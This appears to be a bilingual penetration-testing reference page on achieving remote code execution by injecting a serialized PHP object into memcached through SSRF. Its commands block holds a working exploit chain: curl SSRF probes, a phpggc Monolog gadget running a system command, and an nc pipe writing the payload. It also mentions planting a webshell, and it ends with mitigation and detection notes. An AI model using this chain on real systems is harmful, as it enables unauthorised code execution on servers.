---
topic: Memcached — PHP object injection through SSRF
tags: [linux, memcached, ssrf, php-deserialization, rce]
---

# Memcached — PHP object injection through SSRF

**English** | [🌐 Español](memcached-php-injection.md)

## Concept

Memcached accepts text commands without authentication. If an application caches data it later deserializes and SSRF reaches memcached, an attacker can inject a key with a serialized PHP object. When read, the application deserializes it and runs gadgets.

## When it applies

- Memcached listens on localhost or an internal network.
- The application uses memcached for sessions or cache.
- SSRF allows choosing host and port.

## Procedure

1. Confirm SSRF and memcached access.
2. Build the PHP object with `phpggc`.
3. Write the key with `set` through SSRF.
4. Trigger the read and deserialization.

## Commands

```bash
curl -s "http://<HOST>/fetch?url=http://127.0.0.1:11211/"
phpggc -b Monolog/RCE1 system id > payload.bin
printf 'set cache_key 0 0 %d\r\n' $(wc -c < payload.bin) | cat - payload.bin | nc 127.0.0.1 11211
curl -s "http://<HOST>/read?key=cache_key"
```

## Variants

- Poison a PHP session stored in memcached.
- Use `add` or `replace` without breaking the key.
- Chain an object that writes a webshell.

## Limitations

- The application must deserialize the value.
- SSRF must allow the protocol and port.
- Memcached may be network-protected.

## Mitigation

- Do not deserialize cache data.
- Restrict memcached to localhost and authentication.
- Validate SSRF destinations.

## Detection

- `set` commands from HTTP.
- Serialized PHP objects in memcached.
- SSRF to port `11211`.

## References

- [Memcached — Protocol](https://github.com/memcached/memcached/blob/master/doc/protocol.txt)
- [0xdf — Travel](https://0xdf.gitlab.io/2020/09/12/htb-travel.html)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
